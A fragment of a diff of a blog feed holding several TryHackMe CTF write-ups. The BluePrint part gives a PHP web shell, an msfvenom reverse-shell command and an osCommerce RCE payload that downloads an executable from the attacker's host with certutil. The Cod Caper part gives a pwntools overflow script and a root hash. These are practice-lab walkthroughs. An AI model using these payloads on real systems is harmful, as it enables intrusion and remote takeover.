ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().&lt;/p&gt;&lt;p&gt;fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our &lt;code&gt;proc&lt;/code&gt; variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.&lt;br&gt;With all that our final exploit script becomes&lt;br&gt;&lt;code&gt;from pwn import *&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc = process('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;elf = ELF('/opt/secret/root')&lt;/code&gt;&lt;br&gt;&lt;code&gt;shell_func = elf.symbols.shell&lt;/code&gt;&lt;br&gt;&lt;code&gt;payload = fit({&lt;/code&gt;&lt;br&gt;&lt;code&gt;44: shell_func # this adds the value of shell_func after 44 characters&lt;/code&gt;&lt;br&gt;&lt;code&gt;})&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.sendline(payload)&lt;/code&gt;&lt;br&gt;&lt;code&gt;proc.interactive()&lt;/code&gt;&lt;br&gt;Save that to a .py file and run it, and you should get this output:&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-14-at-19.38.53.png" class="kg-image" alt="thecodcaper CTF | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is &lt;code&gt;$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.&lt;/code&gt;&lt;strong&gt;"&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Happy hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | The Cod Caper&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;A guided room taking you through infiltrating and exploiting a Linux system.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://tryhackme.com"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;TryHackMe | Hacking Training&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;An online platform for learning and teaching cyber security, all through your browser.&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;span class="kg-bookmark-publisher"&gt;TryHackMe&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://tryhackme.com/img/favicon.png" alt="thecodcaper CTF | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/123GivAQB7k0s8" width="480" height="277" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/the-penguin-123GivAQB7k0s8"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;</content:encoded></item><item><title>bebop | drone lovers CTF</title><description>&lt;p&gt;Hello everyone, Today's CTF is available at &lt;strong&gt;www.Tryhackme.com&lt;/strong&gt; rated as an easy challenge so it won't be hard for someone just starting in the field, the concept is based on the Parrot Bebop drone and brings a huge inspiration of the memory of the DEFCON 23 speech "Knocking&lt;/p&gt;</description><link>http://localhost:2368/bebop-drone-lovers-ctf/</link><guid isPermaLink="false">5e949d57e69fa94385575c33</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Mon, 13 Apr 2020 17:23:33 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/Dr63yPm.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/Dr63yPm.png" alt="bebop | drone lovers CTF"&gt;&lt;p&gt;Hello everyone, Today's CTF is available at &lt;strong&gt;www.Tryhackme.com&lt;/strong&gt; rated as an easy challenge so it won't be hard for someone just starting in the field, the concept is based on the Parrot Bebop drone and brings a huge inspiration of the memory of the DEFCON 23 speech "Knocking my neighbour's kids cruddy drone offline", feel free to give it a check, the talk carries a lot of good information.&lt;/p&gt;&lt;figure class="kg-card kg-embed-card"&gt;&lt;iframe width="480" height="270" src="https://www.youtube.com/embed/5CzURm7OpAA?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen&gt;&lt;/iframe&gt;&lt;/figure&gt;&lt;blockquote&gt;Let's start with some enumeration&lt;/blockquote&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.116.147
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-13 17:15 UTC
 Nmap scan report for ip-10-10-116-147.eu-west-1.compute.internal (10.10.116.147)
 Host is up (0.00032s latency).
@@ -355,7 +973,7 @@ r = requests.post(url=target_url, data=data)
 if r.status_code == 200:
     print("[+] Successfully launched the exploit. Open the following URL to execute your code\n\n" + base_url + "install/includes/configure.php")
 else:
-    print("[-] Exploit did not execute as planned")&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;shell.php contains | &amp;lt;?php $cmd=$_GET['cmd']; system($cmd);?&amp;gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The first thing I started with is uploading a simple shell.php code that holds a system() function call, and it executes the given command from the variable $cmd run it, and push back the output pretty simple and powerful.&lt;/p&gt;&lt;p&gt;running the file &lt;strong&gt;configure.php&lt;/strong&gt; in the directory &lt;strong&gt;/oscommerce-2.3.4/catalog/install/inclues/&lt;/strong&gt; will execute our pushed payload and upload our shell&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.44.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;I use python to create a simple server to share files.&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.34.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I ran the command whoami, we are NT AUTHORITY\SYSTEM aka Administrator&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/3q7cjJmyZv7lS" width="480" height="362" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/admin-nowadays-3q7cjJmyZv7lS"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Next, I got my msfconsole ready setting the payload as a windows meterpreter reverse shell tcp, then set my localhost address and my local preferred port and commenced the listener, and without forgetting our reverse shell by itself.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=[LOCAL ADDRESS] lport=[PORT] -f exe &amp;gt; Service_system_update.exe&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;the python exploit that we got from exploit-db, needs to be adjusted again, I modified the payload variable, run the script and the &lt;strong&gt;configure.php&lt;/strong&gt; file from the includes directory.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;payload = '\');'
+    print("[-] Exploit did not execute as planned")&lt;/code&gt;&lt;/pre&gt;&lt;figcaption&gt;shell.php contains | &amp;lt;?php $cmd=$_GET['cmd']; system($cmd);?&amp;gt;&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;The first thing I started with is uploading a simple shell.php code that holds a system() function call, and it executes the given command from the variable $cmd run it, and push back the output pretty simple and powerful.&lt;/p&gt;&lt;p&gt;running the file &lt;strong&gt;configure.php&lt;/strong&gt; in the directory &lt;strong&gt;/oscommerce-2.3.4/catalog/install/inclues/&lt;/strong&gt; will execute our pushed payload and upload our shell&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.44.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;figcaption&gt;I use python to create a simple server to share files.&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.03.34.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;I ran the command whoami, we are NT AUTHORITY\SYSTEM aka Administrator&lt;/p&gt;&lt;p&gt;Next, I got my msfconsole ready setting the payload as a windows meterpreter reverse shell tcp, then set my localhost address and my local preferred port and commenced the listener, and without forgetting our reverse shell by itself.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;msfvenom -p windows/meterpreter/reverse_tcp lhost=[LOCAL ADDRESS] lport=[PORT] -f exe &amp;gt; Service_system_update.exe&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;the python exploit that we got from exploit-db, needs to be adjusted again, I modified the payload variable, run the script and the &lt;strong&gt;configure.php&lt;/strong&gt; file from the includes directory.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;payload = '\');'
 payload += '$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://10.10.75.213/Service_system_update.exe Service_system_update.exe");'
 payload += 'echo $var;'
 payload += '/*'&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.11.48.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-11-at-15.12.58.png" class="kg-image" alt="BluePrint TryHackMe | write-up"&gt;&lt;/figure&gt;&lt;p&gt;to answer your flag questioner all you have to do is hashdump for users hash keys, and decrypt the &lt;strong&gt;NTLM&lt;/strong&gt; hash of the user Lab, the password is very common you can decrypt it just in &lt;strong&gt;crackstation.net&lt;/strong&gt;, and there's a root.txt.txt file in the Desktop of the user Administrator carrying the root flag.&lt;/p&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://crackstation.net/"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;Crackstation is the most effective hash cracking service. We crack: MD5, SHA1, SHA2, WPA, and much more...&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;span class="kg-bookmark-publisher"&gt;MD5, SHA1, Linux, Rainbow Tables, etc.&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://crackstation.net/images/1by1.gif" alt="BluePrint TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-bookmark-card"&gt;&lt;a class="kg-bookmark-container" href="https://www.exploit-db.com/exploits/44374"&gt;&lt;div class="kg-bookmark-content"&gt;&lt;div class="kg-bookmark-title"&gt;osCommerce 2.3.4.1 - Remote Code Execution&lt;/div&gt;&lt;div class="kg-bookmark-description"&gt;osCommerce 2.3.4.1 - Remote Code Execution.. webapps exploit for PHP platform&lt;/div&gt;&lt;div class="kg-bookmark-metadata"&gt;&lt;img class="kg-bookmark-icon" src="https://www.exploit-db.com/favicon.ico" alt="BluePrint TryHackMe | write-up"&gt;&lt;span class="kg-bookmark-author"&gt;Simon Scannell&lt;/span&gt;&lt;span class="kg-bookmark-publisher"&gt;Exploit Database&lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="kg-bookmark-thumbnail"&gt;&lt;img src="https://www.exploit-db.com/images/spider-orange.png" alt="BluePrint TryHackMe | write-up"&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;</content:encoded></item><item><title>Inclusion | CTF write-up</title><description>&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
@@ -431,7 +1049,7 @@ sh: 0: can't access tty; job control turned off
 # id                                                                                
 uid=0(root) gid=0(root) groups=0(root)
 # 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and that's it here, go get your flags! &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/qyIKyAdelGPYI" width="480" height="305" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/this-is-our-youth-qyIKyAdelGPYI"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>CTFcollectionVol2 | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's&lt;/p&gt;</description><link>http://localhost:2368/ctfcollectionvol2-write-up/</link><guid isPermaLink="false">5e8f196e5e61514e230adc53</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 09 Apr 2020 13:28:55 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/holida-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/holida-1.png" alt="CTFcollectionVol2 | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's start with some recon.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.194.62
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and that's it here, go get your flags! &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/xjZtu4qi1biIo" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/thumbs-up-xjZtu4qi1biIo"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>CTFcollectionVol2 | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's&lt;/p&gt;</description><link>http://localhost:2368/ctfcollectionvol2-write-up/</link><guid isPermaLink="false">5e8f196e5e61514e230adc53</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 09 Apr 2020 13:28:55 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/holida-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/holida-1.png" alt="CTFcollectionVol2 | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's start with some recon.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.194.62
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 12:45 UTC
 Nmap scan report for ip-10-10-194-62.eu-west-1.compute.internal (10.10.194.62)
 Host is up (0.00091s latency).
@@ -577,7 +1195,7 @@ Busted: Hey, you found me, take this Easter 6: THM{l37'5_p4r7y_h4rd}
 Vary: Accept-Encoding
 Connection: close
 Content-Type: text/html
-Content-Length: 94328&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;Flag07&lt;/blockquote&gt;&lt;p&gt;In this challenge we have to use the "Invited cookie" with burpsuite, we pass it a number that we have to guess or brute-force but obviously it's A one, and it's the right invite cookie and you'll get the sixth flag&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.03.09.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG08&lt;/blockquote&gt;&lt;p&gt;For flag number 8, The front page source code says that you have to be an iphone to access the content, all you have to do is to modify the User Agent for your request from the original one to an iphone one, and you get the flag.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.03.44.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG09&lt;/blockquote&gt;&lt;p&gt;When we visit the &lt;strong&gt;/ready&lt;/strong&gt; page and use burp to take control of each request, we check the source code of the page we get the flag number 09.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.06.50.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG10&lt;/blockquote&gt;&lt;p&gt;In Flag number 10, you will need to send a &lt;strong&gt;GET&lt;/strong&gt; request with a referrer as 'tryhackme.com' to get back the flag from the page.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.13.09.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG11&lt;/blockquote&gt;&lt;p&gt;In the options on the main page, we see four choices, but we see that "Deskel" prefers egg. We send egg instead of the salad we make DesKel happy and we get the Flag number 10.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.17.18.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG12&lt;/blockquote&gt;&lt;p&gt;don't worry there's always hints in the questions, no need to stress on reading, doing is much easier ... anyway, there's a javascript code in the page go check it, they'll be a function there containing our flag&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.18.28.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG13&lt;/blockquote&gt;&lt;p&gt;Flag number 13 is related to Flag 9, fallow the lead from 9 to 13, same dynamic, source code...&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.06.08.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG14&lt;/blockquote&gt;&lt;p&gt;For flag 14, it's straight forward, the main page source code contain the flag as a png encoded to base64, decode it, and get the flag from the picture.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.19.09-1.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.21.16.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG15&lt;/blockquote&gt;&lt;p&gt;For this Flag, we will play some guessing games, don't get emotional about it, but you are going to lose some brain cells.&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/o331JNuNm9fZ6" width="480" height="269" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/morgan-freeman-one-hand-two-hands-o331JNuNm9fZ6"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.23.18.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.43.53.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Each alphabet is a special hash number, guess the alphabet of each number of the hint, You'll get the flag.&lt;/p&gt;&lt;blockquote&gt;FLAG16&lt;/blockquote&gt;&lt;p&gt;Flag number 16 is very very easy, all you have to do is to click the three buttons on the browser all three at once, and you'll get the flag number 16.&lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.18.07.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;use BURP!&lt;/figcaption&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG17&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.53.57.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;figcaption&gt;Binary baby!&lt;/figcaption&gt;&lt;/figure&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/VbEloWwOz3QqYBsqIZ" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/OTHERCOLORS-matrix-illusion-already-been-made-VbEloWwOz3QqYBsqIZ"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;Binary &amp;gt; Hex &amp;gt; Text&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;FLAG18&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.22.24.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;Just say yes for eggs and you'll be given the flag.&lt;/p&gt;&lt;blockquote&gt;FLAG19&lt;/blockquote&gt;&lt;p&gt;For this flag, when you check the source code of the page, you see that a png image is there but it's not displayed, go get the picture, You get the flag number 19.&lt;/p&gt;&lt;blockquote&gt;FLAG20&lt;/blockquote&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.25.07.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.25.29.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;p&gt;And that's it for today, thank for participating in this 20Flag marathon ...&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/URuzvsMZNVm2wRd9K3" width="480" height="360" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/memecandy-URuzvsMZNVm2wRd9K3"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>JockerCTF | write-up</title><description>&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme it's rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/jockerctf-write-up/</link><guid isPermaLink="false">5e8caabb75832c27370ae6e1</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Tue, 07 Apr 2020 16:31:26 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/joker.jpg" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/joker.jpg" alt="JockerCTF | write-up"&gt;&lt;p&gt;Hello world, I hope you are all well and safe home from the pandemic, today's challenge is a CTF by Tryhackme it's rated medium, but still it needs focus and trying the right techniques, or you'll just dive in a rabbit hole.&lt;/p&gt;&lt;p&gt;Let's get started with some enumeration ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sV -sC 10.10.215.43 
+Content-Length: 94328&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;Flag07&lt;/blockquote&gt;&lt;p&gt;In this challenge we have to use the "Invited cookie" with burpsuite, we pass it a number that we have to guess or brute-force but obviously it's A one, and it's the right invite cookie and you'll get the sixth flag&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.03.09.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG08&lt;/blockquote&gt;&lt;p&gt;For flag number 8, The front page source code says that you have to be an iphone to access the content, all you have to do is to modify the User Agent for your request from the original one to an iphone one, and you get the flag.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.03.44.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG09&lt;/blockquote&gt;&lt;p&gt;When we visit the &lt;strong&gt;/ready&lt;/strong&gt; page and use burp to take control of each request, we check the source code of the page we get the flag number 09.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.06.50.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG10&lt;/blockquote&gt;&lt;p&gt;In Flag number 10, you will need to send a &lt;strong&gt;GET&lt;/strong&gt; request with a referrer as 'tryhackme.com' to get back the flag from the page.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.13.09.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG11&lt;/blockquote&gt;&lt;p&gt;In the options on the main page, we see four choices, but we see that "Deskel" prefers egg. We send egg instead of the salad we make DesKel happy and we get the Flag number 10.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.17.18.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG12&lt;/blockquote&gt;&lt;p&gt;don't worry there's always hints in the questions, no need to stress on reading, doing is much easier ... anyway, there's a javascript code in the page go check it, they'll be a function there containing our flag&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-09-at-15.18.28.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG13&lt;/blockquote&gt;&lt;p&gt;Flag number 13 is related to Flag 9, fallow the lead from 9 to 13, same dynamic, source code...&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-18.06.08.png" class="kg-image" alt="CTFcollectionVol2 | write-up"&gt;&lt;/figure&gt;&lt;blockquote&gt;FLAG14&lt;/blockquote&gt;&lt;p&gt;For flag 14, it's straight forward, the 